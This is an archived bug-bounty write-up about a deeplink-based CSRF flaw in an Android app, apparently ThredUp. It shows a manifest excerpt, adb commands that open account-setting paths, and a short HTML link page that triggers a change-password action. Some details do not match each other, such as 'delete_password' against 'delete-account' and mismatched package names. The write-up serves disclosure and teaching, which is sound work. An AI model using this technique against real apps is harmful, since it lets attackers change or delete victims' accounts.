# CSRF Leads to Delete Account

- **Source URL:** https://medium.com/@happyjester80/csrf-leads-to-delete-account-241f2cf8950b?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20240527062306/https://medium.com/@happyjester80/csrf-leads-to-delete-account-241f2cf8950b
- **Fetched:** 2026-11-27
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/6189 (id 6189)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# CSRF Leads to Delete Account

1 min read5 days ago

# بِسْمِ اللَّـهِ الرَّحْمَـٰنِ الرَّحِيمِ

# Introduction

- Target: Android Application
- Date: May , 2024
- Summary: I discovered a CSRF vulnerability in the Corp Android application that allows an attacker to delete user accounts by exploiting a Deeplink that interacts with the `delete-account` endpoint.

# Steps to Reproduce

- at First we are looking into `AndroidMainfast.xml`

```
        <activity android:theme="@style/Theme.Thredup.Splash" android:name="com.example.android.feature.splash.SplashActivity" android:exported="true" android:launchMode="singleTask" android:screenOrientation="behind" android:configChanges="screenSize|orientation" android:noHistory="true">
            <intent-filter android:autoVerify="true">
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:host="www.example.com" android:pathPrefix="/account"/>
                <data android:scheme="https"/>
                <data android:scheme="http"/>
            </intent-filter>
        </activity>
```
- We found this Deeplink with Path called `/account/` after we call it using adb

`adb shell am start -a android.intent.action.VIEW -n example.android.feature.splash.SplashActivity -d "https://www.example.com/account/"`
- so we are in the Settings now;
- wait a moment what is `android:pathPrefix=/account/` means ??
- `android:pathPrefix` attribute specifies a partial path that is matched against only the initial part of the path in the Intent object so maybe we can find something after `/account/`
- after intercept the API calls after Settings such as Change Password or Delete Account lets try to use these Api Endpoints in Deeplink.

```
adb shell am start -a android.intent.action.VIEW -n com.thredup.android/com.thredup.android.feature.splash.SplashActivity -d "https://www.example.com/account/change_password"
adb shell am start -a android.intent.action.VIEW -n com.thredup.android/com.thredup.android.feature.splash.SplashActivity -d "https://www.example.com/account/delete_password"
```
- let’s make it as CSRF now.

```
<!DOCTYPE html>
<html>
<a href="https://www.example.com/account/change_password">CSRF DEMO</a>
</html>
```
